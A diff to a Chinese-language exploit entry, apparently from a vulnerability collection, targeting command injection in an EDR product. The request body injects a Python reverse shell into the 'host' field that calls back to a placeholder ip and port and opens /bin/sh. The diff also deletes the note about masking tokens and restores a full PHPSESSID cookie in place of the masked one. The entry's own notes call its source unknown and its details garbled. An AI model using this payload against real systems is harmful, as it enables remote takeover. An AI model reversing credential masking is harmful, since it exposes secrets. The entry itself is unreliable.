@@ -34,7 +34,6 @@ source_status: "unknown"
 
 - row URL后粘图片路径尾巴；简介空；Python回连port占位未替换
 - 无原始来源/修复，EDR不应混为VPN路由器
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -86,7 +85,7 @@ source_status: "unknown"
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
     Content-Type: application/x-www-form-urlencoded;charset=utf-8
     Accept-Language: zh-CN,zh;q=0.9
-    Cookie: PHPSESSID=b14**************************a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903
+    Cookie: PHPSESSID=b1464478cad68327229d8f46e60d0a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903
     Content-Length: 256
 
     strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
